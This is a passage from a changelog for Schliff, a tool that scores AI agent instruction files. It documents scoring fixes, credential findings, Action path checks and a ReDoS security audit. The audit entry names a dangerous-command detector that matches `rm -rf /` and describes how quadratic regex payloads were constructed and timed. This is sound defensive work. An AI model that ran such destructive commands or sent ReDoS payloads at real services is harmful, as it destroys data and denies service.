# Changelog

All notable changes to Schliff are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/).

## [Unreleased]

### Added

- **`operational_coverage` now produces fixes.** On an AGENTS.md the heaviest dimension —
  weight 0.4, tied with `structure` — had no fix path at all: a file scoring 0/100 there was
  told to "add 2+ concrete examples" for +1.5 — the only applicable fix among eight, the
  other seven being SKILL-only noise — while forty composite points went unmentioned.
  `text_gradient` now emits a ranked fix for every missing category (setup, build, test,
  code_style, gotchas, pr). Field evidence, 30 real AGENTS.md files: median
  `operational_coverage` 35/100, 17 of 30 below 40.
  The stated delta is exact for the dimension and approximate for the composite — on a
  saturated file the `pr` fix states +4.0 and delivers +2.8, because the added prose dilutes
  `efficiency`; on a bare file it undershoots instead. Confidence is `medium`, and these are
  advice, not auto-applied patches. Each instruction carries a canonical example that the
  tests score, so advice and fixture cannot drift apart — but the examples illustrate, they
  are not a recipe: pasted verbatim they earn a Node repo full test credit for a `pytest` it
  does not have. That is why every command instruction says *your* repo's command and points
  at `schliff check-commands`, which resolves a documented command against the repository.

### Fixed

- **The anti-gaming gate reports an incomplete corpus instead of passing quietly.** It could not
  distinguish "no vector gamed" from "no vector measured": renaming a single skill file under
  `benchmarks/anti-gaming/skills/` left `run.py` at exit 0 while its headline dropped from 7/7 to
  6/7, so the vector stopped being tested and the CI job — which asserts only `returncode == 0` —
  stayed green. Since the gate is enforced in five of the six required status checks, that made
  every earlier green run unprovable in retrospect. The same headline drop is reachable a second
  way, and the likelier one: a vector that is still measured but is **no longer caught**, i.e. a
  detector regression. `main()` now names both — the files that produced no measurement, and the
  vectors whose detector stopped firing — states that the separation results are unproven until
  they are restored, and exits 1; `--json` gains `incomplete` and `uncaught`. The corpus state
  travels in the output rather than short-circuiting it, so a consumer can still see why the run
  failed.

  A shrinking corpus fails too: `incomplete` only sees a declaration whose file went missing, so
  retiring a vector on both sides at once — the ordinary edit — left the run reporting a smaller
  headline and exiting 0. `run.py` now carries a floor on the declared vector count, which is where
  it has to be, because the contributor guidance says to score a new vector with `run.py --json`
  before committing.

  The floor counts distinct vector files, not declarations: counting declarations let a duplicated
  entry stand in for a removed vector, and a copy-pasted entry with an unchanged `file` key would
  have published one more detection than there are vectors.

  What gating on `caught` can and cannot do, stated exactly: it cannot mask a detector that stops
  firing **on six of the seven vectors** — not on `keyword-stuffing.md`, whose target dimension is
  eval-suite-gated and returns the no-suite sentinel, so it reads as caught no matter what the file
  contains (verified by replacing it with the clean control). And it **can** fire on a scorer
  improvement. `bloated-preamble.md` is caught purely by the
  score threshold — its declared filler mechanism emits no issue at all — so raising `efficiency`
  above 80 reddens every required context while separation is untouched. That red is not false, a
  declared detection really did stop penalising, but it fires on an improvement and is a real cost.
  An earlier version of this entry claimed it could never happen; it can, and the vector that
  carries it is named in the follow-up issue.

- **A broken `eval-suite.json` no longer ends the run.** `schliff score`, `bench`, `eval`, `auto`
  and `doctor` all raised on a suite that is a directory, unreadable, not UTF-8, or nested deeply
  enough to exhaust the parser's recursion (the last only below Python 3.14, so CI's newest leg
  stayed green while the oldest failed). Every failure now degrades to "no suite" with a warning
  on stderr. `doctor` distinguishes it from an absent suite via `eval_suite_error` and a per-row
  action that says to repair rather than overwrite. Every file read on the discovery and scoring path — SKILL.md,
  `references/*.md` and `eval-suite.json` — is now checked for being a regular file and for its
  size *before* it is read, so a FIFO cannot hang the scan and an oversized file cannot exhaust
  memory. Those two checks run on the descriptor the read is about to use (`O_NONBLOCK` open,
  then `fstat`), not on the path: checking the path first leaves a window in which it can be
  swapped for a FIFO afterwards, and anyone able to plant the FIFO can also win that race.
  (`read_skill_safe` still reads before checking size, deliberately: it resolves the
  TOCTOU race the other way and its callers sit inside a handler.) `--json` gains `eval_suite_error` per row plus
  `broken_eval_suite`, `grouped_duplicates` and `skills_discovered` in the summary, and such a skill is kept out of the
  `/schliff:init` recommendation — that command would write over the file that failed to load.

- **`doctor` counts one install per skill, not one per copy on disk.** A plugin present in both
  `plugins/cache/` and `plugins/marketplaces/` was scored and billed twice, inflating the skill
  count, the grade distribution and the headline "Total context cost". Copies are now collapsed
  by a digest over SKILL.md, `references/*.md` and `eval-suite.json` — the files a row is
  actually derived from — and every path in a group is printed. Nothing is removed for you, and
  the report states only that comparison: the directories are not compared, so members of a group
  may be different versions of the same plugin and may both be live installs. `--json` gains `duplicate_copies` and `skills_discovered` (the physical file
  count, next to the deduplicated `skills_found`). Path-based exclusion was measured and
  rejected; see `docs/specs/2026-08-13-doctor-counts-vendored-skills.md`, "Amendment 2026-08-26".
  The report describes the counted path as what it is, whichever member sorted first, and draws no
  conclusion from that: it had advised acting on "the copy you control", which under the default
  directories is the reader's own project copy. A duplicated skill also no longer draws
  skill-specific advice telling you to edit it, which contradicted its own row.

- **An oversized `eval-suite.json` says so.** It reported `unreadable`, the same word as a
  permission error, so the fix suggested was to repair a file whose only problem was its size.
  A grouped-and-broken row also truncated its own reason mid-word (`not a JSON objec`), because
  the column was two characters narrower than the string it was widened to keep whole; the
  width is now derived from the reasons the loader can actually produce and asserted by a test,
  so a new reason cannot silently re-open it. And each `eval-suite.json` is read and parsed
  once per run instead of twice — the duplicate read also printed every warning twice. And a
  suite that parses but will not serialise no longer hashes as a fixed marker: two skills with
  different unserialisable suites shared one identity, so the second was reported as a copy of
  the first — and the same held for two suites broken in different ways, which shared the coarse
  reason string. A duplicated skill whose suite is also broken now keeps the "do NOT run
  `/schliff:init` on these" warning, which fell through the counters that gate it. The bounded
  reader no longer references `os.O_NONBLOCK` directly, a Unix-only constant whose absence on
  Windows raised an `AttributeError` past every guard on every scan path. The size guard is now
  asserted through behaviour rather than by spying on `pathlib.Path.read_text`, which stopped
  observing anything when the reader moved to `os.open` — deleting the guard had left its own test
  green. And a run whose duplicate detection failed reports `digest_degraded`, so an uncollapsed
  count can no longer be mistaken for a scan that found no duplicates.

- **Documented commands in tables and indented bullets now count.** `efficiency`
  credited a documented command only as a top-level bullet, so an indented
  sub-bullet or a markdown command table scored nothing. Measured over 1732
  markdown files: 79 hits before, 155 after, and **no previously credited
  command lost**. The widening carries a filter — a table's `|` is structure,
  not an assertion that the cell explains the command, so without one
  `dynamic = 'force-dynamic'` and `new App(...)` were credited as commands.
  Precision on the new shapes is 53/55.

- **Fix deltas on an AGENTS.md no longer understate themselves by ~2.7x.** Every hardcoded
  delta in `text_gradient.py` is a composite estimate sized against **skill.md's** weight
  table — `missing_name: 1.5` is 10 dimension points times structure's 0.15 there — and the
  same literal was emitted whatever the format. On an AGENTS.md, where `structure` carries
  0.4, a file whose only defect was a TODO marker reported delta 1.5 while removing it moved
  the composite 88.6 -> 93.0. Decomposed, structure contributes 10 x 0.4 = +4.00 and
  `efficiency` the remaining +0.40; the gradient now reports exactly that 4.0. The wrong
  number was not the only cost: under-reported structure fixes sank in the ranking, and
  top-N truncation dropped the cheap auto-applicable ones first. The rescale applies to
  `agents.md` alone, because that is the only basis that was measured — `skill.md`,
  `claude.md` and `cursorrules` are unchanged, verified over 494 gradients across 60 corpus
  files: issue for issue, delta for delta, priority for priority.

- **`/schliff:auto` and the dashboard no longer advise an AGENTS.md as if it were a
  SKILL.md.** Three callers resolved no format — `auto-improve.py`, `dashboard.py`, and
  `text_gradient.py`'s own CLI, whose argparse had no `--format` flag at all.
  `compute_gradients` uses the format to decide which fixes apply and `compute_composite`
  to decide which dimensions count, so omitting it broke both halves at once: an AGENTS.md
  was told to create an `eval-suite.json` worth 25 points, and never heard about
  `operational_coverage`. Passing the format alone would not have been enough: both scripts
  hand-listed their dimensions, and the composite counts a dimension missing from that list
  as ZERO — on a bare AGENTS.md, `structure` and `efficiency` under the correct weights
  still give 23.0 where the registry's set gives 35.0, which reads as a weak file rather
  than a bug. The dimension set now comes from the registry, so three hand-maintained
  copies become one source of truth. End to end on that file, the dashboard moves from
  17.4 to 35.0. `text_gradient` also has a `--format` flag now, with `choices` — a typo
  used to exit 0 and print exactly the SKILL-only advice the flag exists to prevent.

- **A line that *is* a command now counts as actionable content.** `efficiency` recognised
  English imperatives at line start, so `- \`tool score <file>\` — score one file` scored
  nothing while "Run the score command" scored. Only commands that carry their explanation
  count: crediting every command-bearing line was measured to rank a dump of `ls -la` and
  `pwd -P` *above* a documented command list, because the score divides signal by word count
  and the dump is shorter. Files that document their commands gain; nothing loses.
- **`composability` recognises an error contract, a prerequisite and a version pin as
  facts, not as phrasings.** "Errors go to stderr with a non-zero exit" now counts as a
  declared error contract, `uv` counts as a declared prerequisite (the tool wordlist could
  never be completed), and `tool@1.2.3` counts as a compatibility statement. The bare
  instruction "pin the version" does **not** count — it is an instruction, naming no
  version. Write the pin itself and it counts:
  ``Pin the version in CI: `tool@1.2.3`.`` is credited by the `tool@version` rule. Note which part
  carries it: the pin, not the phrase. A prose "Pin the version to 1.2.3" matches nothing,
  here or in any earlier release. (Other prose forms are credited by their own unchanged
  patterns — "Minimum version 3.9." and "Compatible with Python 3.12" both count.)
  **Known limit:** an SSH target is credited as a pin — `ssh root@100.127.18.39` earns the
  10 points. Separating an address from a version by pattern turned out not to be decidable
  without taking the credit from honest files, so it is documented rather than papered over.
  The two attempted discriminators, why each failed and what was measured are recorded in
  `docs/specs/2026-08-13-structural-signal-detection.md` under "Amendment 2026-08-25".
- **`doctor` no longer counts vendored copies as installed skills.** A repo with one skill
  reported six — three of them the same file inside virtualenvs and a uv cache archive —
  inflating the skill count, the grade distribution and the headline "Total context cost"
  (37,240 tokens where the real cost was 7,748). Skills in `node_modules`, `.venv`,
  `site-packages`, `.cache` and `.vercel` are skipped. A skill's own directory name never
  excludes it, and a directory above the scan root never does either: a checkout under
  `~/build/` still finds its skills.
- **Three command docs named flags that do not exist.** `/schliff:analyze` and
  `/schliff:bench` documented `run-eval.sh --eval-suite <file>`, which the script rejects
  (it takes the suite positionally); `/schliff:init` documented `init-skill.py --goal` and
  `/schliff:triage` documented `text-gradient.py --focus`, neither of which the parsers
  declare. An agent copies these verbatim, so a flag that does not parse is a broken
  instruction. A test now checks every documented invocation against the real parser.

### Notes

- The composite `dashboard.py` and `auto-improve.py` print **changes for non-SKILL
  formats**, because they now resolve the format and score through the registry. On an
  AGENTS.md it goes up, and by a lot — the dimension they never listed counted as zero
  (a bare AGENTS.md: 17.4 -> 35.0).
  On a CLAUDE.md or a `.cursorrules` the dimension set was already right, but the format
  now reaches the scorers and the weight table, so the number can still move (measured on
  a small CLAUDE.md: 25.3 -> 30.0). A SKILL.md is unaffected, byte for byte. Readings you
  recorded from an earlier version are not comparable for the non-SKILL formats.

- Scores for files that document their commands or state an error contract go **up**; no
  file's score goes down **relative to 8.11.1**, the released version. (Within this
  unreleased block one change withdraws credit: dropping the bare `pin the version`
  phrase. Measured against the unreleased `main`, 3 local files lose 10 composability
  points; 0 of 159 installed skills, and 0 against 8.11.1, which never
  credited the phrase.) If you gate CI with `verify --min-score`, nothing you pass today
  starts failing.
- A denominator cap that would have stopped `efficiency` from penalising long files was
  implemented and reverted before release: it decoupled the score from length, which let
  padding dilute a keyword-stuffing penalty and keep the gain. The underlying limit stays
  open and is documented in `docs/specs/2026-08-13-structural-signal-detection.md`.

## [8.11.1] - 2026-08-10

### Fixed

- **The skill mesh no longer reports a skill as colliding with itself.** Installing the
  same skill in two places — `~/.claude/skills` plus a project-local copy, which is how
  schliff itself is distributed — produced two *critical* findings and cost 27 mesh-health
  points. The pair was never two skills competing; it is one skill at two paths, and the
  remediation the mesh generated for it named the same skill on both sides. Pairs sharing a
  declared name are no longer compared, at every comparison site.
- **A duplicate skill name is now reported as what it is.** `duplicate_name` (severity
  `info`, no health penalty) names every path the skill was found at, because only one of
  them resolves and the file itself does not say which.
- **`doctor` shows mesh findings again after an upgrade.** Its incremental cache keys on
  skill *content*, so upgrading schliff — which changes no file on your disk — used to
  return the verdict computed by the previous version indefinitely. The cache now carries a
  version stamp and discards verdicts written by different analysis logic.

## [8.11.0] - 2026-08-10

### Added

- **Credential findings in `score`, `score --json`, `doctor`, `verify` and the GitHub Action.**
  Schliff points out strings shaped like an AWS access key, a GitHub token, an Anthropic or
  OpenAI key, a Slack token or a Google key. A finding carries the **vendor and the line
  number, never the value** — the Action hands the whole score object to its PR-comment step,
  so output sites cannot be enumerated and the value must not be in the object to begin with.

  **Nothing gates on it, and no exit code changes anywhere.** A green pipeline stays green:
  `verify` still exits on `--min-score` and `--regression` alone, and the Action annotates
  with a warning without failing the job. No score changes either — the composite, every
  dimension, badges, `compare` and every pinned threshold are bit-identical to before.

  **The limitation, stated plainly:** a token's shape does not tell a live key from a
  documentation example. Placeholders that name themselves are excluded — AWS's own
  `AKIAIOSFODNN7EXAMPLE`, `sk-ant-REPLACE_ME…`, `<your-key>`, `${VAR}` — but a placeholder
  that merely looks real will be reported, and a real key in a shape schliff does not know
  will not be. Measured over ~740 real files on the author's machine, every finding the scan
  produced was documentation *about* credentials. JWTs are deliberately not detected at all:
  the jwt.io sample and Supabase's `anon` key are public by design and structurally identical
  to a service key. **This is a report, not a secret scanner** — if you need enforcement, run
  a dedicated one, and read the `credentials` field of `schliff score --json` if you want to
  fail your own build on it.

### Security

- **The Action now refuses paths that resolve outside the workspace.** Both `skill-path` and
  `eval-suite` are checked before schliff reads anything. A pull request from a fork controls
  its own checkout and could previously plant a symlink pointing elsewhere on the runner;
  schliff's messages report existence and exact byte size, which made an unguarded read an
  out-of-repo oracle. A pinned pre-8.11 engine degrades to "no findings" rather than failing
  the parse.

## [8.10.1] - 2026-08-04

**The hosted playground, leaderboard and badge endpoint have been retired.** The CLI, the
GitHub Action, the pre-commit hook and the Claude Code skill are unaffected and continue to
be maintained — this release exists so the published package stops pointing at services
that no longer answer.

### Removed

- **The hosted surfaces are offline.** `schliff-playground.vercel.app` and
  `schliff-leaderboard.vercel.app` now serve a static retirement notice and hold no
  functions and no environment variables. The Redis instance behind the leaderboard's rate
  limiter has been deleted.

  The reason is not the one this started as. The trigger was a provider-identification duty,
  which for a non-monetised open-source demo is genuinely disputed. The load-bearing reason
  is the data-protection information duty, which attaches to **processing** rather than to
  how an operator presents themselves — visitor IPs used as rate-limit keys are processing,
  and no address, wording change or legal opinion discharges that. It is a permanent
  operating obligation, and it was being paid for surfaces with **no demonstrable demand**:
  web analytics was never enabled on either project, and a code search for both URLs found
  references in three repositories, all owned by the maintainer.

  **Badges already embedded in a README do not break.** `/api/badge` still answers, as a
  static shields endpoint reporting `retired` in grey. Both Vercel projects are kept rather
  than deleted, deliberately: a released `*.vercel.app` subdomain is re-registrable, and
  this project's own Action had already written the playground URL into third-party pull
  requests.

  The application code and its tests stay in the repository. Full rationale and the
  rejected alternatives — including a service address and a static client-side rebuild —
  are in [`docs/adr/0008-retire-hosted-surfaces.md`](docs/adr/0008-retire-hosted-surfaces.md).
  ([#176](https://github.com/Zandereins/schliff/pull/176),
  [#177](https://github.com/Zandereins/schliff/pull/177))

### Fixed

- **The documented CI recipe granted no permissions while the feature it documents needs
  one.** `comment-on-pr` defaults to `true` and the comment step needs `pull-requests:
  write`, but the README workflow carried no `permissions:` block. In repositories whose
  default token is read-only the documented feature failed silently; in repositories with a
  read-write default the workflow ran with more privilege than it needed. The example now
  carries the minimal set that this project's own self-test workflow already used.
  ([#177](https://github.com/Zandereins/schliff/pull/177))

- **Added the warning against `pull_request_target` that was missing.** It is exactly the
  trigger a user reaches for when fork-PR comments fail, and it pairs a write-scoped token
  with a checkout of untrusted code. On a fork PR the read-only token is the *intended*
  degradation — the score and the exit code still work, only the comment is skipped — and
  the docs now say so instead of leaving the reader to discover it.
  ([#177](https://github.com/Zandereins/schliff/pull/177))

- **The CI example pinned `actions/checkout@v4`** while every workflow in this repository
  pins by commit SHA. For a tool that argues for supply-chain care, teaching the unpinned
  form was the wrong signal. It now uses the same SHA the workflows here already trust.
  ([#177](https://github.com/Zandereins/schliff/pull/177))

- A README link rendered as `#10` while pointing at pull request 129.
  ([#177](https://github.com/Zandereins/schliff/pull/177))

### Changed

- **The README now says where a model is involved and where it is not.** Scoring calls no
  model and core Schliff is literally zero-dependency — `pyproject.toml` declares no
  `dependencies` at all. The two opt-in extras that do call one run **from the user's own
  machine with the user's own API key**; this project operates no inference service, holds
  no key, and receives nothing that is scored. Without the extra installed those paths
  refuse to run rather than degrading silently, and `schliff evolve --budget 0` never
  imports the LLM path at all. The install table now names the actual packages
  (`anthropic`, `pydantic`, `litellm`) instead of saying "LLM client".
  ([#178](https://github.com/Zandereins/schliff/pull/178))

- `RELEASING.md` drops the web-redeploy step and the playground engine pin: there are now
  **six** version surfaces, not eight. ([#177](https://github.com/Zandereins/schliff/pull/177))

## [8.10.0] - 2026-08-04

Four correctness fixes, all in the same place: a value that describes *how* a file was
measured, reported wrongly. Three of them were found by verifying the fourth.

### Changed

- **`--format skill` and `--format skill.md` scored the same file differently — the alias
  is now the canonical name, which LOWERS the score for files without frontmatter.**
  Measured on `AGENTS.md`: 39.3 via the alias, 34.5 via the canonical spelling. Across the
  29 tracked instruction files in this repo, exactly the 8 that carry no YAML frontmatter
  diverged, by 4.7–5.5 composite points — two of them real files in the project's own
  benchmark corpus, so this was not an edge case nobody met.

  `shared.build_scores` branched on a raw string compare (`fmt != "skill.md"`), so the
  public `skill` alias entered a normalization branch that its canonical twin skips. For a
  file without frontmatter that branch invents a name and description from the body and
  scores the wrapped copy — `structure` went 50 → 80 and the `no_frontmatter` issue
  disappeared. **The alias was hiding the exact defect the dimension exists to report.**

  The two spellings agreeing is not a judgment call for a deterministic scorer; which side
  they agree on is. Normalization exists so formats that *legitimately* carry no
  frontmatter (CLAUDE.md, AGENTS.md, `.cursorrules`) are scorable at all, and a SKILL.md is
  defined by its frontmatter — so the un-normalized, lower number is the measurement and
  39.3 was the flattered one. This is why the release is a minor and not a patch.

  Only the stated-format path moves. `detect_format` already returned canonical names, so
  auto-detection, every other command, and the playground are strict no-ops — verified
  cell by cell. Nothing that pins a format in CI can change verdict either: a stated format
  reaches the engine only through `score`, never through `verify`.

  Gate: 29 files × 12 format values (`None`, all 10 registry/alias choices, and `unknown`),
  comparing the composite *and* every per-dimension score — **340/348 cells byte-identical**,
  and the 8 that moved are exactly the accused set, each now equal to its canonical twin.
  ([#173](https://github.com/Zandereins/schliff/pull/173))

- **The reported format echoed the `--format` alias instead of the format's name.** A
  genuine SKILL.md scored with `--format skill` printed `Format: skill (normalized)`, where
  neither half was true — `skill` is not the format's name, and content that already has
  frontmatter is returned unchanged. The JSON `format` field now reports canonical names
  for every alias (`--format claude` → `claude.md`). No consumer breaks: the leaderboard
  validates against its own display vocabulary, which never accepted engine names.
  ([#173](https://github.com/Zandereins/schliff/pull/173))

### Fixed

- **`--format system-prompt` silently dropped the security dimension, worth up to 15
  composite points.** The same file, the same version: `49.4` with 7 dimensions when the
  format was detected, `36.8` with 6 and no `security` when it was stated through the
  public hyphenated alias. Spread across five files: 5.9 to 15.0 points. The user who pins
  the format explicitly — the more careful thing to do in CI — got the wrong number.

  `shared.build_scores` dispatched on a raw `fmt == "system_prompt"`, which the
  `system-prompt` alias fails; the file then fell through to the instruction-file branch,
  where the `include_security` gate removes a dimension that is CORE for `system_prompt`
  (weight 0.15). Dispatch now resolves through a single `registry.resolve_format()`, which
  also replaced the inline copies of that lookup — the duplication is why one caller could
  forget it. ([#168](https://github.com/Zandereins/schliff/pull/168))

- **`schliff doctor <typo>` exited 0.** A named directory that does not exist rendered
  "No skills found. Check skill directories." and exited successfully — indistinguishable
  from an empty directory, so no CI gate could catch the typo. The report then listed the
  DEFAULT scan directories, which it had not scanned, as if those were the ones that came
  up empty. `verify` had always errored on a missing file; `doctor` disagreed with it.

  Validation sits at the CLI boundary, so library callers are untouched, and only paths the
  user NAMED are checked — the built-in defaults stay optional, because `.claude/skills`
  legitimately does not exist in most repos and the no-arg scan is the common invocation. A
  path that exists but is a regular file is rejected too; it previously scanned to zero in
  silence. ([#169](https://github.com/Zandereins/schliff/pull/169))

- **The version stamped into every score described the installed package, not the engine
  that produced the score.** `_resolve_version()` read `importlib.metadata`, i.e. the
  installed dist-info, while its docstring promised the value "can never drift from
  pyproject.toml" — in a source or editable checkout those are different things, and the
  docstring was part of the defect. Measured in this repo: all three gated version sources
  said 8.9.0, `schliff version` said 8.1.0, and the console script was loading the 8.9.0
  working tree the whole time.

  Not cosmetic — `score --json` stamps this value as `version`, so it propagated into
  benchmark JSONL and leaderboard entries, attributing measurements to an engine version
  that never produced them. Now read from the package `__init__.py` next to the module,
  which is already gated against `pyproject.toml`, and resolved by path rather than by
  import so the answer does not depend on how the CLI was invoked. A `pip install` user was
  never affected; their metadata matches their code.
  ([#172](https://github.com/Zandereins/schliff/pull/172))

## [8.9.0] - 2026-07-30

### Security

- **Five scoring regexes were quadratic on untrusted input; the worst cost 162 seconds
  of CPU for one unauthenticated request.** A trust-boundary audit of the whole repo found
  the same defect in four of them; the new empirical gate found the fifth,
  `_RE_SKILL_AS_OBJECT`, on its first run. It is not the textbook ReDoS shape — no nested
  quantifier, no overlapping alternation, just **an unbounded run followed by a required
  literal**. `[\w/]+` before a required `\.` consumes to the end of the input,
  fails on the dot, and gives back one character at a time, once per start position.

  The measured worst case sat *inside* the public playground's 32 KB input cap, whose
  own comment claimed that cap bounded "any residual O(n^2) hot path to well under a
  second": 162.6 s at 25,883 bytes against 46 ms for a benign payload of the same
  length, growing 4.01× per doubling. Reachable unauthenticated via `POST /api/score`
  and `GET /api/badge?repo=`, from the CLI at the 1 MB cap, and — the worst blast
  radius — from the GitHub Action on a fork PR's AGENTS.md, i.e. in other people's CI.

  Fixed by bounding **only the quantifier the measurement blames**, with every bound
  **calibrated against the longest run it actually consumes across 380 real instruction
  files** rather than guessed: 58 for `[\w/]+`, 118 for `[\w/.-]+`, 1,151 for a backtick
  span, 19 for `[\w-]+` in a trigger prompt. A first guessed bound of 120 would have sat
  one character above a real 118-character token and truncated a real 1,151-character
  span; the failure mode of a guessed bound is a silent score change.

  Whitespace runs are deliberately left unbounded. Self-review of the first commit
  caught it bounding `rm\s+` to `rm\s{1,8}` "for consistency" with the flag runs that
  were the real quadratic source — which cost **five detections that 8.8.2 caught**
  (`rm` plus 9 or more spaces or tabs, then `-rf /`), for no gain: that run is prefixed
  by the literal `rm`, which limits how many start positions it is reachable from, so it
  never contributed to the blowup. The pattern is linear without the whitespace bound
  (1.92–2.04× per doubling, measured on a whitespace-run payload). This is the #149
  defect class reproduced internally — narrowing a matcher without enumerating its
  evasion classes, then checking only that the corpus verdict did not move, which a
  corpus cannot show for an evasion it does not contain. Gated by
  `TestDangerousCmdWhitespaceIsNotBounded`, which walks whitespace-run length 1…100 for
  spaces and tabs on both sides of the flag cluster; re-introducing the mistake turns 11
  assertions red.

  `clarity` needed a second, independent fix: bounding its regexes alone only took the
  worst case from 162.6 s to 11.9 s, because the match-independent context build and
  search sat *inside* the per-match loop, turning O(n²) into O(m·n²). Hoisting them out
  is output-identical by construction. Bound plus hoist: **58.9 ms**.

  Two-sided acceptance, because a one-sided "is it fast now" check is how a narrowing
  ships as a silent detection loss: **0 of 250 real files change their clarity result**,
  the published hero score and every case-study number reproduce byte-identically
  against a clean `main` worktree with identical commands, and every malicious shape is
  still detected with the same finding counts. `rm -rf /` still matches and the Docker
  layer-cleanup false positive stays fixed.

  Patterns: `_RE_SPECIFIC_REF`, `_RE_CONCRETE_CMD`, `_RE_SEC_DANGEROUS_CMD` (three
  consecutive unbounded flag runs before a required `/`), `_RE_LENGTH_EXTENDED` (the
  *second* branch — the first fails fast on digits, which is why an early probe against
  one branch showed nothing), and `_RE_SKILL_AS_OBJECT`.

- **Two gates against a recurrence.** `test_patterns_scale_linearly.py` times all 224
  compiled patterns across 30 modules against 25 pathological filler alphabets at
  doubling lengths and fails on super-linear growth — it found `_RE_SKILL_AS_OBJECT`,
  which was not on the audit's fix list, on its first run. It confirms an offender at two
  consecutive doublings with more repetitions before failing, because the healthy margin
  is 1.3–2.4× against a 3.0× threshold and a single sample under load did flake once
  during development; verified red-capable (4.20×, 4.02× confirmed) and green four times
  over under four busy cores. `test_patterns_are_bounded.py` is its deterministic
  companion: it pins each bounded spelling and pins each bound above the corpus maximum
  it was calibrated from, so tightening one below the real data fails too.

  **What these gates do not cover, stated rather than implied:** the empirical one reaches
  exactly as far as its filler alphabet. Its first draft also covered only 11 modules and
  138 patterns while the harness that found the defects covered 25 and 224 — a gate
  narrower than the harness it replaces is not a regression guard, so the module list was
  widened (0 additional findings, so the coverage was free) and a count assertion now
  fails if it ever shrinks. The remaining blind spot is real and documented in the test:
  `manifest._FM` is quadratic on a frontmatter-shaped input and none of the generic
  fillers trip it. A shape nobody thought of stays invisible.

  A repo-wide *static* rule was prototyped and rejected on measurement: "any unbounded
  quantifier on a character class" flagged 47 of the 102 patterns in `scoring/patterns/*`,
  and the refinement "…with no required literal prefix" still flagged 11, including one
  certain false positive. A gate whose allowlist is longer than its findings is the thing
  it exists to prevent.

- **`schliff manifest` parsed third-party frontmatter quadratically and read files with
  no size cap at all.** `manifest` walks every SKILL.md under `~/.claude/skills`, every
  command under `~/.claude/commands`, the project's `.claude/`, and the payload of every
  enabled plugin — all third-party content — and its frontmatter regex opened with
  `^---\s*\n`. `\s` matches the newline itself, so every possible `\s*` length restarted
  the lazy body scan: 25.6 s at 64 KB, 4.04× per doubling, ~1.9 h extrapolated at 1 MB.
  Through the shipping CLI on one hostile 64 KB skill: **30.77 s → 0.22 s**.

  Fixed with `[^\S\n]*` — whitespace except the newline. A class that cannot span the
  record separator cannot restart that scan: 1.5 ms at 64 KB, linear, and every code point
  the class admits was probed individually for a revived blowup (1.97–2.07× per doubling).
  **0 divergences from 8.8.2 across 14 enumerated separators.** The narrower `[ \t]*\r?`
  tried first lost four of them — form feed, vertical tab, NBSP, em space — which for a
  tool that reports resolved state means a `disable-model-invocation: true` skill reads as
  LOADED. Caught in review by enumerating the dimension, not sampling it; gated for all 14
  shapes including that consequence. The count was first published as six, from an
  enumeration run against in-memory strings — `parse_frontmatter` reads with universal
  newlines, which collapses the CR-based shapes before the regex sees them, so `\r` is
  harmless but not load-bearing on this path. The translation is now pinned by a test.

  Separately, the read was a raw `read_text()` with no `MAX_SKILL_SIZE` — the only reader
  in the engine without one. Both call sites did `fm, _ = parse_frontmatter(...)`, so the
  body was the only reason a whole file had to be in memory: the fix reads a bounded
  65,536-character head and drops the body from the signature, which removes the unbounded
  read, the quadratic trigger and a dead return value together. The bound is calibrated,
  not guessed — across 248 real skills, commands and plugin payloads the frontmatter block
  runs a median of 694 characters, p95 4,476, max 15,711, so it carries 100% with 4×
  headroom. Characters, not bytes: `read(n)` on a text handle counts code points, so the
  constant is named `_FM_READ_CHARS` rather than promising a byte guarantee the call does
  not make.

  Verified against the real install: `manifest --json` output is byte-identical to `main`
  (same sha256, 109 artifacts, 8,240 resident tokens, 19 findings). The empirical ReDoS
  gate gained the frontmatter-shaped fillers that were the documented blind spot, so this
  defect is now caught by the gate rather than by hand.

- **The playground's byte cap was bypassable with a negative `Content-Length`.**
  `read_len = min(content_length, MAX_CONTENT_SIZE)` is `-1` when the header is `-1`, and
  `rfile.read(-1)` reads to EOF — so the cap that line's own comment promises did not hold.
  Measured by driving `do_POST` with an instrumented socket: **3,145,832 bytes read against
  a 512,000-byte cap.** The leaderboard's `submit.py` already had the `< 0` half of its
  guard; the playground did not. Now rejected as `400 Invalid Content-Length header`, the
  same reason the endpoint already gives for an unparseable one.

  Honest scope: bounded in practice by Vercel's own body limit, and whether the edge
  forwards a negative `Content-Length` at all is unverified — checking would mean probing
  production. Defence in depth and a fixed asymmetry between two sibling endpoints, not a
  demonstrated live exploit.

- **`run-eval.sh`'s 2-second regex timeout guard could be silently inactive.**
  `_GREP_TIMEOUT` is set only when `gtimeout` or `timeout` resolves on PATH, and neither
  ships with a stock macOS — so there the guard is inert *and* its `124) pattern timed out`
  branch is dead code, with nothing in the output saying so. A guard you cannot tell apart
  from a working one is worse than a documented absence. It now prints a one-time note
  naming the consequence and the remedy.

  Deliberately not replaced by a portable Python fallback: measured, the sink does not
  backtrack — GNU grep, BSD grep 2.6.0 and ugrep 7.5.0 are all DFA-based and stayed flat
  (0.044–0.050 s) on the patterns the complexity guard accepts. This is defence in depth,
  while swapping ERE for Python `re` would re-run the dialect regression that left six
  assertions dead on CI for months.

- **`clarity`'s function docstring contradicted its own module docstring**, claiming a
  zero default weight and a `--clarity` opt-in. Both were stale — clarity runs in the
  default scorer set for every format — and that contradiction is exactly what made two
  quadratic sub-checks in that function look unreachable.

  Spec: `docs/specs/2026-07-30-redos-audit-fixes.md`.

### Changed

- **The SKILL.md token budget was set below the median of what it measures.** It flagged
  75% of a 166-file installed-skill population (median 1,960, p75 2,934) and 44% of
  schliff's own 16-file calibration corpus — including the format's own reference
  implementations (Anthropic's `skill-creator` 8,047, `writing-skills` 6,582,
  `brainstorming` 2,649) and, pointedly, schliff's own card at `1,045 / 1,000 (over)`
  immediately after being trimmed from 11,700 to 4,240 chars for exactly this reason.

  A threshold at roughly the 12th percentile of its own population reports "yes" and
  carries no information. Raised to **2000**, just above the measured median, so it flags
  the upper half rather than the upper three quarters without adopting the population's
  bloat as the target. A SKILL.md stays held at least as tight as a CLAUDE.md and tighter
  than an AGENTS.md, and `brainstorming` at 2,649 is still flagged — context paid on every
  trigger is worth naming. The derivation is recorded beside the constant so it stops
  being a magic number; the other budgets in that table were not measured and are unchanged.

  This is advisory only — token budgets never enter a score. `within_budget` does gate
  whether a watch hook reports growth, which is where the missing selectivity actually
  cost something.

  The same boundary falls out of a measurement this project already published —
  `docs/launch/state-of-ai-instructions.md` "Length Has a Sweet Spot": across 120 files the
  300–2000 token band averages composite 64.5, under 300 averages 51.3, over 2000 averages
  59.9. So 2000 marks where files start scoring measurably worse, not merely where the
